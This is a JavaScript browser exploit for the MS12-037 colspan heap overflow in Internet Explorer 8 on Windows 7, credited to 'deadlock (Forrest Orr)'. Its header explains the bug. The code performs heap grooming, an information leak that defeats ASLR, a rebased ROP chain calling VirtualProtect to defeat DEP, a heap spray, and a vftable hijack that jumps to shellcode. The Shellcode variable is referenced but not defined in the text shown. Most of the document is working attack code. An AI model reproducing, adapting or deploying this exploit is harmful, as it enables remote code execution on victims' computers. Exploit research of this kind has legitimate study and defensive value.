/*
   _____     _________ ____ ________        _______   ________ _________  
  /     \   /   _____//_   |\_____  \       \   _  \  \_____  \\______  \ 
 /  \ /  \  \_____  \  |   | /  ____/ ______/  /_\  \   _(__  <    /    / 
/    Y    \ /        \ |   |/       \/_____/\  \_/   \ /       \  /    /  
\____|__  //_______  / |___|\_______ \       \_____  //______  / /____/   
        \/         \/               \/             \/        \/           
Exploit Title: Windows 7 x86/Wow64 Heap Overflow
Date: 2021-05-24
Exploit Author: deadlock (Forrest Orr)
Vendor Homepage: https://www.microsoft.com/
Software Link: https://www.microsoft.com/en-gb/download/internet-explorer.aspx
Version: IE8 32-bit
Tested on: Windows 7 SP1 Pro x64/Internet Explorer 8 32-bit (8.00.7601.17514)
CVE: MS12-037
Bypasses: DEP, ASLR

-------------------------------------------------------------------------------

Overview

This exploit is loosely based on the public Metasploit module for MS12-037 on
Github [1]. It does however contain substantial enhancements when compared to
the MSF version - these are: ASLR bypass via infoleak and pseudo-dynamic ROP
chain creation via runtime gadget module re-basing.

The exploit works by triggering two consecutive heap overflows, both targetting
a CButtonLayout object. The first overflow is used to read MSHTML.DLL module
pointers from the CButtonLayout, while the second overflow is used to overwrite
the vftable pointer of this same CButtonLayout. A method within this object is
subsequently called, triggering an EIP redirect via a heap sprayed vftable to a
stack pivot in MSHTML.DLL.   

The underlying bug is within a colspan array buffer referenced by a CTableLayout
structure. CTableLayout contains a pointer to an array of column span objects,
each with a size of 0x1C, with a total count equal to that of the "span" value
of the bugged column tag (ID "132"). When the value of "span" is changed, the
size of the colspan array dynamically grows but is NOT re-allocated, resulting
in a heap overflow. The heap overflow itself is limited in the sense that the
data in the overflow cannot be fully controlled. It can be influenced, in the
sense that the span objects in the array are (to a large extent) populated
with values derived from the "width" field of the column. Thus we can ensure
that the data within the heap overflow will primarily consist of a repeated
arbitrary 32-bit value of our choice. This value is a new (larger) BSTR length
in the first heap overflow, and the absolute address of a heap sprayed fake
vftable in the second heap overflow.

~

Quirks

x

~

Links

1. https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ms12_037_ie_colspan.rb
                                                                          
*/

// Quirks
//
// The MSF version of this exploit did not work on Windows 7 64-bit in any of my tests. While analyzing the exploit,
// I discovered a strange inconsistency in the MSF code, wherein the author had made the assumption that the "width"
// value of the column will be multiplied by 100 when calculating the values to be embedded into the colspan buffer
// array. On my Windows 7 64-bit OS, the width is multiplied by 150, thus I had to calculate my heap spray address
// differently.
//
// Additionally, the absolute address of the heap sprayed vftable in the MSF variation of this exploit (0x07070024)
// was highly unreliable in my own tests, often already being committed by the memory manager. Therefore, I chose
// a significantly higher address (0x0AEB0024) for my own heap spray.
//
// Because of the fact that my chosen heap spray address of 0x0AEB0024 is not a clean multiple of 150, I had to
// chose a slightly higher address which was a clean multiple (0x0AEB0082) and then pad the start of my heap sprayed
// chunks with the difference (94 bytes) for a clean EIP direct when the vftable of the corrupted CButtonLayout is
// hijacked.
//
// At present, the exploit is not 100% reliable: the colspan buffer will not always "fall" into one of the trap
// free blocks created by the heap grooming after CollectGarbage and thus will not always overflow the correct object.
// I have around a 90% success rate.


var ButtonContainerDiv = document.getElementById("ButtonContainer");
var SprayCount = 400; // This is enough to consistently hit 0x0AEB0000
var SprayArray = new Array(SprayCount); // CollectGarbage will free heap sprayed chunks if this is not global.

ButtonContainerDiv.style.cssText = "display:none";
FreeBlocks = new Array(); // Globally declare these so that they are not freed when the heap grooming function returns
A_StrBlocks = new Array();
B_StrBlocks = new Array();
Clog_StrBlocks = new Array();

function HeapSpray(Content, StartOffset, RegionCount) { // Spray the data specified in Content in 0x10000 chunks within 1MB allocated regions. The starting offset of the content in the 1MB chunks may be 0, or any multiple of 2.
    var PrePadding = unescape("%u1111");
    var TailPadding = unescape("%u2222");
    var Data;
    
    if(StartOffset > 0) {
        Data = PrePadding;
        
        for(i = 0; i < ((StartOffset / 2) - 1); i++) { // -1 for var init
            Data += PrePadding;
        }
        
        Data += Content
    }
    else {
        Data = Content;
    }
    
    // These are chunks of 0x10000 bytes, then x 16 for 1MB. 0x10000 is the ideal size for heap spray as it ensures consistency, while 1MB is not (they will not always begin at a consistent 1MB multiple). 1MB chunks have a 0x20 header size, others have 0x8. 0x10000 will end up as sub-chunks within the 1MB allocations with no headers. This ensures that any multiple of 0x10000 ie. 0x11a00000, 0x11b00000, etc. will always be hit, and the payload will be at offset 0x24 within them (to accomodate 1MB header size of 0x20 + 4 byte BSTR length).
    
    while (TailPadding.length < (65536/2)) { // This is a fast way of making a large chunk
      TailPadding = TailPadding + TailPadding
    }
    
    Data = Data + TailPadding;
    
    // 65536 * 16 = 1048576 (1MB). Exclude 38 (0x26) bytes for heap chunk header (0x20 bytes), BSTR length (0x4 bytes), null terminator (0x2 bytes).
    
    var SprayChunk = Data.substr(0, 65536/2);
    
    for (i = 0; i < 14; i++) {
        SprayChunk += Data.substr(0, 65536/2);
    }
    
    SprayChunk += Data.substr(0, (65536/2) - (38/2));
    
    for (i = 0; i < RegionCount; i++) {
      SprayArray[i] = SprayChunk.substr(0, SprayChunk.length);
    }
}

function ReBaseRopChain(ModuleBase) {
    var RopChain = [
        ModuleBase + Number(0x00014ef8), // RET
        ModuleBase + Number(0x00014ef7), // POP EAX ; RET
        // MSHTML.DLL will CALL [EAX + 8] while trying to access a method within the corrupted/overflowed CButtonLayout where EAX is 0x0AEB0082, my padded heap spray block (the fake vftable).
        ModuleBase + Number(0x14F917),   // XCHG EAX, ESP ; RETN 0
        ModuleBase + Number(0x00014ef7), // POP EAX
        ModuleBase + Number(0x1348),     // MSHTML!VirtualProtect
        ModuleBase + Number(0x6F0BB),    // MOV EAX, DWORD PTR [EAX] ; RET
        ModuleBase + Number(0x28E833),   // XCHG EAX, ESI ; RET
        ModuleBase + Number(0x00014ef7), // POP EAX
        0x90909090,
        ModuleBase + Number(0x00002c60), // POP EBP ; RET
        ModuleBase + Number(0x372369),   // JMP ESP
        ModuleBase + Number(0x00003059), // POP EBX ; RET
        0x5000,
        ModuleBase + Number(0x00002fa9), // POP ECX ; RET
        ModuleBase + Number(0x00538000), // <MSHTML!.data>
        ModuleBase + Number(0x0009ced0), // POP EDX ; RET
        0x00000040,
        ModuleBase + Number(0x000030ae), // POP EDI ; RET
        ModuleBase + Number(0x00014ef8), // ROPNOP
        ModuleBase + Number(0x000394a1), // PUSHAD ; RET
        0x90909090 // Alignment NOP sled for this table. Will be combined with NOP sled from EAX for a total length of 8 bytes.
    ];
     
    return RopChain;
}
 
function DwordToUnicode(Dword) {
    var Unicode = String.fromCharCode(Dword & 0xFFFF);
    Unicode += String.fromCharCode(Dword >> 16);
    return Unicode;
}

function TableToUnicode(Table) {
    var Unicode = "";
    
    for (i = 0; i < Table.length; i++) {
        Unicode += DwordToUnicode(Table[i]);
    }

    return Unicode;
}

function PadString(Count, PadChar) {
    var Str = "";
    var Offset = 0;
    
    do {
        Str += PadChar;
        Offset += 1;
    } while (Offset < Count);

    return Str;
}

function UnicodeStrToInt(Str) {
    return (Str.charCodeAt(1) * 0x10000) + Str.charCodeAt(0); // 2 wide chars = 4 bytes
}

function HeapGroom(){
    var FreeStr = PadString(125, "F"); // 250 (0xFA) bytes, +4 for BSTR length = 254 (0xFE), +2 for null terminator = 256 (0x100). Span (size 0x1C * 9) = 0xFC.
    var A_Str = PadString(125, "A"); // The purpose of the A Block is to properly align the B block with a viable span value. Placing a BSTR directly after the CTableLayout makes corruption of its BSTR length difficult
    var B_Str = PadString(125, "B")
    var ClogStr = PadString(125, "C");

    // Clog any existing free chunks on the heap for our span size: without this, the exploit will typically fail in a scenario where the browser had actually been used to previously load full web pages due to the noise.
    
    for(var i = 0; i < 100; i++) {
        Clog_StrBlocks[i] = ClogStr.substr(0, ClogStr.length);
    }
        
    // [Free][A][B][CButtonLayout]
    
    for (i = 0; i < 500; i++) {
        FreeBlocks[i] = FreeStr.substring(0, 125);
        A_StrBlocks[i] = A_Str.substring(0, 125);
        B_StrBlocks[i] = B_Str.substring(0, 125);
        var CButtonObj = document.createElement("button");
        ButtonContainerDiv.appendChild(CButtonObj);
    }
    
    for (i = 0; i < 500; i++) {
        FreeBlocks[i] = null;
    }
    
    CollectGarbage(); // [Free][A][B][CButtonLayout] -> [Span array][A][B][CButtonLayout]
}

function VtableOverflow() {
    var BuggedCol = document.getElementById("132");
    BuggedCol.width = "1221155"; // 0x0AEB0082. Multiple of 150, not 100.
    BuggedCol.span = "44";   
}
    
function CollectMemoryLeak(){
    var OverflowedBlockIndex = -1;

    for(i = 0; i < 500; i++) {
        if(B_StrBlocks[i].length != 125) {
            OverflowedBlockIndex = i;
            break;
        }
    }
    
    if(OverflowedBlockIndex != -1) {
        //alert(OverflowedBlockIndex);
        var MshtmlBase = UnicodeStrToInt(B_StrBlocks[OverflowedBlockIndex].substring(136, 140));
        MshtmlBase = MshtmlBase - Number(0x158690);
        //alert(MshtmlBase.toString(16));
        var RopChain = TableToUnicode(ReBaseRopChain(MshtmlBase)) ;
        var Payload = RopChain + Shellcode;
        HeapSpray(Payload, 94, 400); // 0x0AEB0082 - 0x0AEB0024 bytes of padding
        //alert("Heap spray finished... overwriting CButtonLayout vftable...");
        VtableOverflow();
    }
    else {
        alert("Memory leak overflow failed. No BSTR length corrupted.");
    }
}

function BstrOverflow() {
    var BuggedCol = document.getElementById("132");
    BuggedCol.width = "149"; // Multiple of 150, not 100.
    BuggedCol.span = "22";
}

HeapGroom(); // GC is async
setTimeout(function(){BstrOverflow()},500); // Heap overflow does not immediately occur after span is modified.
setTimeout(function(){CollectMemoryLeak()},1500); // Since GC is async, for extra stability I sleep after running it in HeapGroom, and this in turn requires accurately spacing BstrOverflow and CollectMemoryLeak. When both the setTimeout routines run, they set their timers and then continue execution async. 
